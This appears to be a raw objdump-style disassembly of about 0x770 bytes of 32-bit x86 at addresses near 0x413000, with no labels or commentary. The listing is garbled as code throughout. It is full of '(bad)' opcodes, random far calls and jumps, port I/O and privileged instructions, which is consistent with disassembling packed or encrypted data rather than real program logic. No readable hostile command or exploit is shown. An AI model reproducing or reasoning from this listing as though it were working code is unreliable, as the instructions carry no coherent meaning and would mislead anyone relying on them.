  4136be:	fdivrp st(4),st
  4136c0:	push   ebp
  4136c1:	jg     0x41369b
  4136c3:	dec    ebp
  4136c4:	mov    BYTE PTR [edx+0x47],al
  4136c7:	push   eax
  4136c8:	and    eax,DWORD PTR [edi-0x5f]
  4136cb:	pop    ecx
  4136cc:	fnsave [eax]
  4136ce:	adc    DWORD PTR [edi+0x17],esp
  4136d1:	lods   al,BYTE PTR ds:[esi]
  4136d2:	xchg   ecx,eax
  4136d3:	mov    edi,0xdf36640f
  4136d8:	jg     0x413672
  4136da:	push   edx
  4136db:	std    
  4136dc:	add    dh,0xb3
  4136df:	dec    ebx
  4136e0:	jl     0x4136b8
  4136e2:	mov    bl,0x25
  4136e4:	inc    esi
  4136e5:	adc    ebx,ebp
  4136e7:	ss enter 0xa44f,0x8e
  4136ec:	xchg   ecx,eax
  4136ed:	add    esi,ebp
  4136ef:	sbb    edi,0x8ea8c19a
  4136f5:	inc    esi
  4136f6:	pushf  
  4136f7:	xor    dh,BYTE PTR [ebx-0x1eccc411]
  4136fd:	arpl   WORD PTR [esi+0xb],bx
  413700:	jl     0x4136fa
  413702:	xchg   esp,eax
  413703:	scas   eax,DWORD PTR es:[edi]
  413704:	push   esi
  413705:	jbe    0x4136ff
  413707:	pushf  
  413708:	mov    eax,0x99ffcbd
  41370d:	pop    edx
  41370e:	(bad)  
  413710:	lods   al,BYTE PTR ds:[esi]
  413711:	int    0xda
  413713:	mov    al,0x93
  413715:	std    
  413716:	daa    
  413717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413718:	push   ebx
  413719:	mov    cl,0x9b
  41371b:	xor    dl,ch
  41371d:	jb     0x413779
  41371f:	out    0x86,al
  413721:	or     al,0xa8
  413723:	scas   eax,DWORD PTR es:[edi]
  413724:	sub    BYTE PTR [ecx+ebx*2+0x3d],al
  413728:	std    
  413729:	scas   eax,DWORD PTR es:[edi]
  41372a:	ins    BYTE PTR es:[edi],dx
  41372b:	ret    
  41372c:	pop    ss
  41372d:	aaa    
  41372e:	adc    bl,BYTE PTR [esi]
  413730:	bound  ebx,QWORD PTR [ebx]
  413732:	retf   0xabb2
  413735:	int    0x64
  413737:	js     0x41371c
  413739:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41373b:	sbb    al,0xa5
  41373d:	ja     0x413754
  41373f:	test   BYTE PTR [ecx-0x236c2c83],al
  413745:	cdq    
  413746:	xchg   esp,eax
  413747:	leave  
  413748:	xchg   esp,eax
  413749:	popa   
  41374a:	sbb    al,0x2f
  41374c:	cmovae esp,DWORD PTR [ebx]
  41374f:	mov    WORD PTR [ebp-0x7b],?
  413752:	or     al,0x35
  413754:	jl     0x413738
  413756:	xchg   ecx,eax
  413757:	adc    eax,0x5480140a
  41375c:	inc    ebp
  41375d:	dec    ecx
  41375e:	call   0xf3c5:0xec0abf37
  413765:	bound  edx,QWORD PTR [esi-0x6d]
  413768:	in     eax,dx
  413769:	inc    edi
  41376a:	push   edi
  41376b:	push   0xffffffa5
  41376d:	mov    DWORD PTR [edx-0x561abcc2],esp
  413773:	jnp    0x413779
  413775:	das    
  413776:	lock shl dh,cl
  413779:	push   0xffffffc0
  41377b:	xchg   ebp,eax
  41377c:	add    BYTE PTR [eax+esi*4-0x28ffc310],ch
  413783:	xlat   BYTE PTR ds:[ebx]
  413784:	rol    DWORD PTR [eax],1
  413786:	jmp    0x4137a9
  413788:	add    al,BYTE PTR [bp+di]
  41378b:	test   eax,0x131cca9d
  413790:	ds xchg ebp,eax
  413792:	push   esi
  413793:	pop    esi
  413794:	rcr    edx,0xeb
  413797:	repz les ebx,FWORD PTR [edi+0x23e8ab82]
  41379e:	and    ah,BYTE PTR [ebx+edi*8]
  4137a1:	jns    0x4137ee
  4137a3:	clc    
  4137a4:	hlt    
  4137a5:	cmp    DWORD PTR [ecx],esi
  4137a7:	mov    bl,0x12
  4137a9:	call   0xe3ed:0x46f44650
  4137b0:	xchg   al,ah
  4137b2:	or     BYTE PTR [ebx-0x6bd7a8ce],0xb4
  4137b9:	scas   al,BYTE PTR es:[edi]
  4137ba:	ret    
  4137bb:	add    DWORD PTR [ebx+ebp*1+0x7ffe8520],ecx
  4137c2:	pushf  
  4137c3:	sbb    al,BYTE PTR [ecx+ebp*1]
  4137c6:	dec    esi
  4137c7:	imul   DWORD PTR [edx+0x2c]
  4137ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137cb:	addr16 out dx,eax
  4137cd:	adc    DWORD PTR [edx-0x39aeb689],0x7a
  4137d4:	add    eax,0x57a9fed
  4137d9:	pop    es
  4137da:	and    eax,0xb010f873
  4137df:	dec    edx
  4137e0:	lahf   
  4137e1:	jmp    0x2ef0:0xcffc160
  4137e8:	ror    BYTE PTR [esi],0x32
  4137eb:	aas    
  4137ec:	and    al,0xb8
  4137ee:	or     eax,0x1cfe44db
  4137f3:	jb     0x413791
  4137f5:	leave  
  4137f6:	ja     0x4137f2
  4137f8:	add    esi,DWORD PTR [eax]
  4137fa:	aam    0x7c
  4137fc:	imul   esi,DWORD PTR [eax-0x49103ab5],0x45
  413803:	push   es
  413804:	pop    esi
  413805:	jmp    0x433e:0x9b6c4f57
  41380c:	mov    bl,0x8
  41380e:	pop    esi
  41380f:	int3   
  413810:	cmp    ch,BYTE PTR [ebx]
  413812:	sbb    eax,0x417270c4
  413818:	pop    edx
  413819:	dec    ebp
  41381a:	jl     0x413896
  41381c:	cdq    
  41381d:	cmp    eax,0xcd0b47f1
  413822:	sbb    ebx,0xffffffdb
  413825:	inc    edi
  413826:	leave  
  413827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413828:	ds inc ebp
  41382a:	adc    al,0xb2
  41382c:	xor    BYTE PTR [ecx],0x90
  41382f:	loop   0x413821
  413831:	sbb    al,0xec
  413833:	and    edx,DWORD PTR [ebx+eiz*8-0x6ea3e155]
  41383a:	shr    BYTE PTR [ebx+0x7a],0x51
  41383e:	add    al,0x5a
  413840:	sub    ebp,DWORD PTR [esi]
  413842:	ins    DWORD PTR es:[edi],dx
  413843:	pop    ds
  413844:	dec    esp
  413845:	not    BYTE PTR [eax+0x6]
  413848:	popa   
  413849:	jmp    0x4137da
  41384b:	jnp    0x413824
  41384d:	outs   dx,BYTE PTR ds:[esi]
  41384e:	cwde   
  41384f:	inc    DWORD PTR [ebx]
  413851:	sub    eax,0xe3482f
  413856:	shr    ch,0x1c
  413859:	dec    ebp
  41385a:	lds    edi,FWORD PTR [edi+0x1f]
  41385d:	sbb    edx,DWORD PTR [ebp-0x8ca065e]
  413863:	retf   0x3d6a
  413866:	lea    edx,[esi+0x6c9febd1]
  41386c:	retf   
  41386d:	fldenv [ebx+ecx*4-0x54c174e0]
  413874:	pop    ebp
  413875:	adc    dh,BYTE PTR [edx]
  413877:	nop
  413878:	or     al,0x41
  41387a:	sub    al,0x6f
  41387c:	pop    esp
  41387d:	jmp    DWORD PTR [ecx+0x9]
  413880:	inc    esi
  413881:	mov    si,0xb6ac
  413885:	xor    DWORD PTR [ebx+eax*2-0x59],ebp
  413889:	enter  0xa16e,0xb2
  41388d:	std    
  41388e:	adc    bl,al
  413890:	push   es
  413891:	jmp    0x423a:0xc1882074
  413898:	add    BYTE PTR [eax+0x5f],ch
  41389b:	mov    bl,BYTE PTR [ebp-0x505b4b23]
  4138a1:	pop    ebp
  4138a2:	cmp    ebx,esp
  4138a4:	pop    es
  4138a5:	stos   DWORD PTR es:[edi],eax
  4138a6:	push   edi
  4138a7:	cld    
  4138a8:	inc    eax
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	(bad)  
  4138ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ac:	adc    al,0x36
  4138ae:	or     ebp,DWORD PTR [ecx-0x56]
  4138b1:	add    al,0x2a
  4138b3:	test   eax,0x2f366076
  4138b8:	fdiv   DWORD PTR ds:0x6e43383d
  4138be:	inc    eax
  4138bf:	inc    esp
  4138c0:	mov    ah,BYTE PTR [esi+0x3b]
  4138c3:	fwait
  4138c4:	hlt    
  4138c5:	les    esi,FWORD PTR [eax]
  4138c7:	jns    0x41391f
  4138c9:	daa    
  4138ca:	clc    
  4138cb:	mov    al,ds:0xbeba56e0
  4138d0:	dec    eax
  4138d1:	(bad)  
  4138d2:	jne    0x413876
  4138d4:	clc    
  4138d5:	iret   
  4138d6:	push   ebp
  4138d7:	jle    0x413866
  4138d9:	adc    BYTE PTR [ecx+0x23],0xe2
  4138dd:	push   ss
  4138de:	imul   eax,DWORD PTR [ebx+0x39aeadc7],0x65642a33
  4138e8:	mov    dl,0x5b
  4138ea:	mov    ebp,0xefdcd703
  4138ef:	push   ds
  4138f0:	fcmovne st,st(7)
  4138f2:	or     eax,0xa727752f
  4138f7:	lods   eax,DWORD PTR ds:[esi]
  4138f8:	xor    eax,0x48bc941b
  4138fd:	or     ebp,ebx
  4138ff:	js     0x4138e6
  413901:	pushf  
  413902:	sub    ebp,DWORD PTR [edx-0x299fe82d]
  413908:	popf   
  413909:	dec    ebx
  41390a:	sub    ebx,DWORD PTR [esi-0x5eb2e69c]
  413910:	mov    eax,ds:0x2f8fee9b
  413915:	mov    bl,0xa3
  413917:	mov    edx,0xdf60ef36
  41391c:	or     BYTE PTR ds:0xc713a65d,0x6c
  413923:	sbb    ch,bh
  413925:	ins    DWORD PTR es:[edi],dx
  413926:	ja     0x41396c
  413928:	lods   al,BYTE PTR ds:[esi]
  413929:	cmp    bh,ah
  41392b:	add    DWORD PTR [edx],edi
  41392d:	(bad)  
  41392e:	test   ebx,0x7f85997
  413934:	add    dl,0xc4
  413937:	pop    ecx
  413938:	dec    edx
  413939:	add    al,0xac
  41393b:	daa    
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41393e:	mov    BYTE PTR [edi-0x73],al
  413941:	ror    esi,1
  413943:	daa    
  413944:	inc    ebp
  413945:	inc    esp
  413946:	div    DWORD PTR [edi-0x31]
  413949:	pop    esi
  41394a:	pop    ds
  41394b:	into   
  41394c:	add    dh,BYTE PTR [edi+0x9a0c383]
  413952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413953:	rcr    DWORD PTR [esi],cl
  413955:	fnstenv [edi-0x72]
  413958:	jae    0x4138f2
  41395a:	xlat   BYTE PTR ds:[ebx]
  41395b:	mov    al,0xbf
  41395d:	sbb    eax,DWORD PTR [edi+0x59dc065e]
  413963:	xor    ah,bh
  413965:	ja     0x4139d1
  413967:	inc    esi
  413968:	cld    
  413969:	push   ss
  41396a:	and    al,0x88
  41396c:	and    edx,edx
  41396e:	jl     0x413904
  413970:	in     al,0x6d
  413972:	jne    0x413917
  413974:	sub    ch,BYTE PTR [ebp-0x12]
  413977:	add    cl,cl
  413979:	pusha  
  41397a:	push   0x2cc338ab
  41397f:	call   0xddbb:0xd07a441
  413986:	pusha  
  413987:	(bad)  
  413988:	in     al,dx
  413989:	cdq    
  41398a:	and    eax,0x9dbb68bb
  41398f:	in     eax,0xdf
  413991:	outs   dx,BYTE PTR ds:[esi]
  413992:	imul   eax,esi,0x35
  413995:	mov    ch,0xd3
  413997:	mov    al,dl
  413999:	into   
  41399a:	pop    ss
  41399b:	dec    eax
  41399c:	outs   dx,BYTE PTR ds:[esi]
  41399d:	(bad)  
  41399e:	imul   ecx,DWORD PTR [ecx+0x48fcef2e],0xffffffb3
  4139a5:	mov    ecx,gs
  4139a7:	xor    al,0xfb
  4139a9:	imul   esi,esi,0xffffffe7
  4139ac:	cld    
  4139ad:	imul   edi,DWORD PTR [eax],0x3b
  4139b0:	aaa    
  4139b1:	mov    ebp,0x2b8eb69b
  4139b6:	jbe    0x4139e5
  4139b8:	lods   eax,DWORD PTR ds:[esi]
  4139b9:	aaa    
  4139ba:	jle    0x413988
  4139bc:	sahf   
  4139bd:	inc    esp
  4139be:	hlt    
  4139bf:	jecxz  0x4139c6
  4139c1:	xor    al,0xcc
  4139c3:	loope  0x4139dc
  4139c5:	jbe    0x413997
  4139c7:	sbb    edx,DWORD PTR [ebx]
  4139c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ca:	xor    ebx,DWORD PTR [eax]
  4139cc:	xchg   edx,eax
  4139cd:	out    0x4d,eax
  4139cf:	jb     0x41395e
  4139d1:	vmovaps xmm1,xmm3
  4139d5:	xor    al,0x2b
  4139d7:	or     BYTE PTR [ecx],bl
  4139d9:	or     al,0xf3
  4139db:	out    0x26,al
  4139dd:	sbb    DWORD PTR [edx],edx
  4139df:	add    DWORD PTR [esi-0x724a2f65],esi
  4139e5:	pop    ss
  4139e6:	inc    ebx
  4139e7:	sbb    BYTE PTR [edx],dh
  4139e9:	cmc    
  4139ea:	or     DWORD PTR [eax+0x7baf5d7],eax
  4139f0:	stos   BYTE PTR es:[edi],al
  4139f1:	test   ecx,esp
  4139f3:	fild   WORD PTR [eax+0x2bc29490]
  4139f9:	aaa    
  4139fa:	sub    BYTE PTR [edi-0x21],ch
  4139fd:	inc    ebp
  4139fe:	pop    ss
  4139ff:	jecxz  0x413989
  413a01:	dec    esi
  413a02:	outs   dx,DWORD PTR ds:[esi]
  413a03:	jge    0x413a7c
  413a05:	mov    al,0x73
  413a07:	pmaxub mm0,mm6
  413a0a:	adc    dh,ch
  413a0c:	fnstsw WORD PTR [ebx]
  413a0e:	xchg   edx,eax
  413a0f:	loop   0x413a04
  413a11:	inc    ecx
  413a12:	cwde   
  413a13:	jo     0x4139b8
  413a15:	test   DWORD PTR [edi-0x77],eax
  413a18:	and    ah,BYTE PTR [edi-0x7346ccad]
  413a1e:	out    dx,al
  413a1f:	and    eax,0xa443174f
  413a24:	outs   dx,DWORD PTR ds:[esi]
  413a25:	inc    edx
  413a26:	enter  0xe70,0xcb
  413a2a:	xchg   edx,eax
  413a2b:	inc    esi
  413a2c:	add    DWORD PTR [edx+0x2ed072dd],ebp
  413a32:	jl     0x413a8b
  413a34:	pop    edx
  413a35:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413a37:	imul   edx,ebx,0x72
  413a3a:	add    edx,DWORD PTR [esi]
  413a3c:	jmp    0x892d0ef6
  413a41:	xor    eax,0x993a6136
  413a46:	dec    esp
  413a47:	add    DWORD PTR [eax+0x1d152650],esp
  413a4d:	lds    ebp,FWORD PTR [ebx+0x43]
  413a50:	xchg   edi,eax
  413a51:	ss mov eax,0x72402ea1
  413a57:	mov    eax,DWORD PTR [esi+0x72]
  413a5a:	xor    edi,edi
  413a5c:	out    dx,al
  413a5d:	cmc    
  413a5e:	pop    ss
  413a5f:	jg     0x4139e4
  413a61:	jae    0x413a1b
  413a63:	cmp    al,ah
  413a65:	mov    bh,0xf5
  413a67:	mov    eax,ds:0xa1d29def
  413a6c:	pop    edx
  413a6d:	inc    eax
  413a6e:	mov    bl,0xb4
  413a70:	scas   eax,DWORD PTR es:[edi]
  413a71:	sar    BYTE PTR ds:0x8b2a1e77,cl
  413a77:	push   es
  413a78:	fadd   QWORD PTR [ebx]
  413a7a:	mov    ecx,0x1834c2e8
  413a7f:	popf   
  413a80:	ret    
  413a81:	rol    cl,1
  413a83:	outs   dx,DWORD PTR ds:[esi]
  413a84:	(bad)  
  413a85:	jle    0x413a3b
  413a87:	mov    al,ds:0x35ae0d89
  413a8c:	mov    edx,ss
  413a8e:	push   ss
  413a8f:	daa    
  413a90:	imul   cl
  413a92:	or     al,0x6e
  413a94:	mov    ecx,0xba3f4249
  413a99:	adc    DWORD PTR [ebx-0x3b76d3d1],edx
  413a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aa0:	dec    edx
  413aa1:	jg     0x413a28
  413aa3:	aas    
  413aa4:	ins    DWORD PTR es:[edi],dx
  413aa5:	test   eax,0xe9b5b795
  413aaa:	jge    0x413aa1
  413aac:	das    
  413aad:	mov    dl,0xb3
  413aaf:	scas   al,BYTE PTR es:[edi]
  413ab0:	stos   DWORD PTR es:[edi],eax
  413ab1:	xor    al,0x2e
  413ab3:	or     dl,0xe2
  413ab6:	add    BYTE PTR [ecx-0x4bd4a697],0x57
  413abd:	outs   dx,BYTE PTR ds:[esi]
  413abe:	sub    bl,BYTE PTR [edi]
  413ac0:	das    
  413ac1:	js     0x413a76
  413ac3:	push   cs
  413ac4:	inc    esp
  413ac5:	sbb    eax,0x7955c86
  413aca:	ins    DWORD PTR es:[edi],dx
  413acb:	pusha  
  413acc:	cmp    eax,0xc4df75a2
  413ad1:	add    al,0xac
  413ad3:	push   ss
  413ad4:	cs icebp 
  413ad6:	push   0x974b183f
  413adb:	sbb    eax,0xe09873d
  413ae0:	dec    edi
  413ae1:	int3   
  413ae2:	clc    
  413ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae4:	mov    dl,0x1b
  413ae6:	(bad)  
  413ae8:	pop    ebx
  413ae9:	inc    eax
  413aea:	test   eax,0xfac34263
  413aef:	mov    bl,0x4c
  413af1:	add    al,0xb0
  413af3:	sub    eax,0xc6ee3175
  413af8:	xor    eax,0xd7491b89
  413afd:	stc    
  413afe:	dec    eax
  413aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b00:	mov    WORD PTR [esi-0x297cd614],ds
  413b06:	push   eax
  413b07:	xor    BYTE PTR [eax-0x75],al
  413b0a:	gs loopne 0x413a90
  413b0d:	inc    ecx
  413b0e:	inc    edx
  413b0f:	mov    edi,0x4b611763
  413b14:	dec    ecx
  413b15:	jecxz  0x413ab0
  413b17:	call   0x20cb5986
  413b1c:	(bad)  
  413b1d:	xchg   esi,eax
  413b1e:	xchg   DWORD PTR [eax],edx
  413b20:	ins    BYTE PTR es:[edi],dx
  413b21:	add    bh,dl
  413b23:	lahf   
  413b24:	and    BYTE PTR [ebp-0x7f],dh
  413b27:	stc    
  413b28:	push   ecx
  413b29:	mov    esp,DWORD PTR [ecx-0x51]
  413b2c:	or     al,0xaf
  413b2e:	push   ecx
  413b2f:	repnz aam 0xd1
  413b32:	or     eax,0xba38beb7
  413b37:	cmp    al,0x52
  413b39:	mov    ecx,0x8a3f5925
  413b3e:	fcomi  st,st(4)
  413b40:	jge    0x413b29
  413b42:	jno    0x413bb0
  413b44:	popf   
  413b45:	bound  ebx,QWORD PTR [edx+0x75]
  413b48:	int3   
  413b49:	test   eax,0xba85a5df
  413b4e:	pop    ecx
  413b4f:	lods   eax,DWORD PTR ds:[esi]
  413b50:	cmp    al,0x7c
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	mov    ds:0x487cd570,eax
  413b58:	push   cs
  413b59:	hlt    
  413b5a:	cdq    
  413b5b:	repz pop es
  413b5d:	or     al,0xd5
  413b5f:	cmp    al,0x56
  413b61:	mov    al,0xa0
  413b63:	leave  
  413b64:	xchg   BYTE PTR [eax+0x133300d9],bl
  413b6a:	pop    ss
  413b6b:	xlat   BYTE PTR ds:[ebx]
  413b6c:	add    al,0x14
  413b6e:	push   ebx
  413b6f:	fsubr  DWORD PTR [esi]
  413b71:	and    ebp,DWORD PTR [ecx-0x4235dbc3]
  413b77:	shl    BYTE PTR [ebx+edx*4-0x1d],cl
  413b7b:	ret    
  413b7c:	arpl   bp,sp
  413b7e:	test   DWORD PTR [esi],ebx
  413b80:	push   ebp
  413b81:	mov    ds:0xa8727726,al
  413b86:	loopne 0x413bf3
  413b88:	sub    esi,DWORD PTR [ebp+0x1bba2a95]
  413b8e:	dec    edx
  413b8f:	lods   eax,DWORD PTR ds:[esi]
  413b90:	aaa    
  413b91:	and    DWORD PTR [bx+di-0x2130],ecx
  413b96:	xor    bh,BYTE PTR [edx-0x4b]
  413b99:	xchg   sp,ax
  413b9b:	popa   
  413b9c:	gs sti 
  413b9e:	mov    WORD PTR ds:0x9357b3ef,?
  413ba4:	retf   0x5d36
  413ba7:	shl    cl,1
  413ba9:	and    DWORD PTR [ebx],esp
  413bab:	sub    BYTE PTR [ebx-0xa021e04],al
  413bb1:	int    0x2
  413bb3:	les    ecx,FWORD PTR [eax+ebp*2+0x64c96078]
  413bba:	mov    esp,0xcbb66201
  413bbf:	aad    0x2a
  413bc1:	adc    al,BYTE PTR [edi]
  413bc3:	in     eax,dx
  413bc4:	pop    esi
  413bc5:	jnp    0x413c14
  413bc7:	ror    dh,cl
  413bc9:	push   ebx
  413bca:	or     BYTE PTR [eax],cl
  413bcc:	call   0xf814:0x73f592af
  413bd3:	sub    ebx,ebx
  413bd5:	pop    esp
  413bd6:	add    ebx,ebp
  413bd8:	push   0x7018948b
  413bdd:	xchg   BYTE PTR [edx],al
  413bdf:	test   dl,0x5d
  413be2:	and    esp,DWORD PTR [eax-0x5f]
  413be5:	pop    eax
  413be6:	rol    al,0x6
  413be9:	xchg   edx,eax
  413bea:	sub    eax,0xc855441f
  413bef:	(bad)  
  413bf1:	push   es
  413bf2:	mov    ecx,0x5e6ac06f
  413bf7:	add    dl,BYTE PTR [eax-0x50]
  413bfa:	jmp    0xf2cdfd87
  413bff:	xchg   ebx,eax
  413c00:	fld    st(2)
  413c02:	pop    ax
  413c04:	enter  0x7957,0x59
  413c08:	jecxz  0x413c0c
  413c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c0b:	inc    edi
  413c0c:	push   esp
  413c0d:	scas   eax,DWORD PTR es:[edi]
  413c0e:	mov    dl,0xf1
  413c10:	ror    DWORD PTR ds:0xb9855a46,1
  413c16:	dec    ebx
  413c17:	mov    esi,0xa81fe1e3
  413c1c:	jmp    0x413bb9
  413c1e:	jb     0x413bbe
  413c20:	daa    
  413c21:	(bad)  
  413c23:	into   
  413c24:	xchg   edi,eax
  413c25:	jne    0x413c5f
  413c27:	jae    0x413ca1
  413c29:	dec    edx
  413c2a:	mov    esp,0x40038467
  413c2f:	sar    ch,cl
  413c31:	mov    ah,0x58
  413c33:	mov    BYTE PTR [eax-0x61],0x28
  413c37:	or     eax,0x18f6d7fc
  413c3c:	mov    al,ds:0xacee3099
  413c41:	retf   
  413c42:	scas   eax,DWORD PTR es:[edi]
  413c43:	xor    eax,0x9d75c951
  413c48:	ret    
  413c49:	adc    edx,DWORD PTR [ebx-0x63]
  413c4c:	sub    BYTE PTR [edi+0x25],bl
  413c4f:	fist   WORD PTR [ebp-0x27d0bc8a]
  413c55:	pop    es
  413c56:	inc    ecx
  413c57:	(bad)  
  413c58:	rol    ch,1
  413c5a:	jle    0x413cd9
  413c5c:	xchg   ecx,eax
  413c5d:	jecxz  0x413bff
  413c5f:	pop    ecx
  413c60:	cmc    
  413c61:	xchg   ebp,eax
  413c62:	mov    dh,0x67
  413c64:	call   0xf41595b1
  413c69:	jbe    0x413c31
  413c6b:	test   BYTE PTR [edx-0x40],dl
  413c6e:	cmp    BYTE PTR [esi+0x2fc97e93],bl
  413c74:	cwde   
  413c75:	add    al,0xaf
  413c77:	bound  esp,QWORD PTR [esi+0x0]
  413c7a:	mov    eax,0x90b36f3f
  413c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c80:	ins    BYTE PTR es:[edi],dx
  413c81:	outs   dx,BYTE PTR ds:[esi]
  413c82:	in     eax,dx
  413c83:	in     eax,0x15
  413c85:	out    0xdf,eax
  413c87:	push   0x87b2b8d4
  413c8c:	sar    esp,cl
  413c8e:	or     edx,esp
  413c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c91:	gs (bad) 
  413c93:	lock mov dl,0x95
  413c96:	push   ebx
  413c97:	xchg   esi,eax
  413c98:	lock pop ebx
  413c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c9b:	sbb    esp,DWORD PTR ds:0x9799882b
  413ca1:	aam    0xbe
  413ca3:	cmp    eax,0x4c44b197
  413ca8:	mov    edx,0x3cd3abf6
  413cad:	sub    BYTE PTR [ecx+0x6cc6d41b],0xce
  413cb4:	jg     0x413d31
  413cb6:	push   esp
  413cb7:	push   edx
  413cb8:	rcl    ah,0x4e
  413cbb:	push   ecx
  413cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cbd:	push   ds
  413cbe:	cmp    bl,BYTE PTR [ebx-0x6d]
  413cc1:	push   edx
  413cc2:	and    DWORD PTR [ecx+0x5110a15d],eax
  413cc8:	inc    esi
  413cc9:	lods   al,BYTE PTR ds:[esi]
  413cca:	sti    
  413ccb:	arpl   WORD PTR [edx+0x25fb843d],bx
  413cd1:	add    bh,cl
  413cd3:	inc    ecx
  413cd4:	pop    ds
  413cd5:	mov    edx,0xc3f5c7e1
  413cda:	popa   
  413cdb:	push   0x568819f1
  413ce0:	push   0xa65fb453
  413ce5:	jo     0x413d44
  413ce7:	xor    BYTE PTR [edi*1-0x4de1330e],dl
  413cee:	test   BYTE PTR [ecx-0x3396cbfe],bh
  413cf4:	xlat   BYTE PTR ds:[ebx]
  413cf5:	jno    0x413c82
  413cf7:	stos   DWORD PTR es:[edi],eax
  413cf8:	xor    DWORD PTR [edx-0x3c54455f],esp
  413cfe:	(bad)  
  413cff:	mov    ebx,0x8073a863
  413d04:	and    DWORD PTR [esi],esp
  413d06:	lea    edi,[esi]
  413d08:	add    al,0xdb
  413d0a:	sbb    al,0x39
  413d0c:	mov    cl,0x84
  413d0e:	jo     0x413d7a
  413d10:	lods   al,BYTE PTR ds:[esi]
  413d11:	jp     0x413d18
  413d13:	and    ebp,ecx
  413d15:	jecxz  0x413cc4
  413d17:	out    dx,al
  413d18:	in     al,dx
  413d19:	mov    fs,WORD PTR [ebx+0x31]
  413d1c:	pusha  
  413d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d1e:	loop   0x413cc2
  413d20:	lahf   
  413d21:	shl    BYTE PTR [ecx-0x73bfa95e],1
  413d27:	adc    BYTE PTR [eax+0xd],bh
  413d2a:	push   esi
  413d2b:	pop    ebp
  413d2c:	lahf   
  413d2d:	test   BYTE PTR [ebp-0x7d],cl
  413d30:	jmp    0x413cc8
  413d32:	fmul   st(6),st
  413d34:	dec    ebx
  413d35:	jp     0x413da4
  413d37:	daa    
  413d38:	ss push ebx
  413d3a:	adc    eax,0x54a1c6b9
  413d3f:	jle    0x413d26
  413d41:	xor    al,BYTE PTR [eax+ebp*8+0xa8a5a50]
  413d48:	ins    DWORD PTR es:[edi],dx
  413d49:	jae    0x413d10
  413d4b:	push   ecx
  413d4c:	mov    edx,0xf8dbbbbb
  413d51:	mov    cl,0xd9
  413d53:	repnz popa 
  413d55:	sbb    ch,BYTE PTR [esi+0x434b952d]
  413d5b:	repnz sub bl,BYTE PTR [eax]
  413d5e:	pop    eax
  413d5f:	loope  0x413dc2
  413d61:	xchg   edi,eax
  413d62:	mov    ecx,ds
  413d64:	dec    ebx
  413d65:	jb     0x413d92
  413d67:	std    
  413d68:	xor    esi,DWORD PTR [ecx-0x4c]
  413d6b:	dec    ebx
  413d6c:	cmp    ch,al
  413d6e:	out    dx,al
  413d6f:	mov    edx,0xb8802421
  413d74:	jmp    0x501fccdc
  413d79:	fucomip st,st(3)
  413d7b:	test   DWORD PTR [ebx+0x56],0xc1be5244
  413d82:	leave  
  413d83:	mov    ds:0x58e97928,eax
  413d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d89:	mov    al,ds:0x1df4629e
  413d8e:	cmp    BYTE PTR [ebx+0x3f],al
  413d91:	js     0x413dd3
  413d93:	sbb    eax,0x22350d9f
  413d98:	inc    edx
  413d99:	or     cl,BYTE PTR [esi]
  413d9b:	ret    
  413d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d9d:	push   ss
  413d9e:	cli    
  413d9f:	fwait
  413da0:	jmp    0x413d78
  413da2:	dec    edi
  413da3:	ror    BYTE PTR [ebp+0x48],1
  413da6:	test   dh,bh
  413da8:	es (bad) 
  413daa:	in     al,dx
  413dab:	and    dh,0x71
  413dae:	aas    
  413daf:	rcr    DWORD PTR [esi+0x5419e2e9],1
  413db5:	push   0xffffffc0
  413db7:	es inc ecx
  413db9:	and    al,0x9a
  413dbb:	xchg   DWORD PTR fs:[esi+0x58],ebp
  413dbf:	pop    ss
  413dc0:	add    cl,BYTE PTR [esi]
  413dc2:	rcr    BYTE PTR [esi],0x48
  413dc5:	rcr    DWORD PTR [ebp+0x6ccfa0a0],cl
  413dcb:	pop    ecx
  413dcc:	das    
  413dcd:	repnz adc ch,BYTE PTR [esi]
  413dd0:	dec    ecx
  413dd1:	mov    DWORD PTR [edi],edi
  413dd3:	out    dx,eax
  413dd4:	and    eax,0xc5a27939
  413dd9:	daa    
  413dda:	dec    eax
  413ddb:	es pushf 
  413ddd:	test   al,0xaa
  413ddf:	cli    
  413de0:	pop    edi
  413de1:	jb     0x413dd5
  413de3:	int3   
  413de4:	lea    edi,[edx+0x5c]
  413de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de8:	ja     0x413dab
  413dea:	sbb    bl,BYTE PTR [ecx+0x2]
  413ded:	mov    DWORD PTR [edi+0x33ceb153],ecx
  413df3:	mov    ah,0xb
  413df5:	sub    eax,0xb49920b8
  413dfa:	cmp    eax,0x2911e95d
  413dff:	pusha  
  413e00:	cwde   
  413e01:	pop    edx
  413e02:	cmp    al,BYTE PTR [edx-0x4537e2bf]
  413e08:	mov    eax,ds:0xd8bb44af
  413e0d:	stos   DWORD PTR es:[edi],eax
  413e0e:	retf   0xb59e
  413e11:	jmp    0x3251:0x8f266a09
  413e18:	sbb    eax,0xdb430f11
  413e1d:	inc    eax
  413e1e:	fcomp  DWORD PTR [edx]
  413e20:	push   0x6b
  413e22:	inc    ecx
  413e23:	pusha  
  413e24:	sub    DWORD PTR [edx],edx
  413e26:	mov    eax,ds:0x5c0c25cb
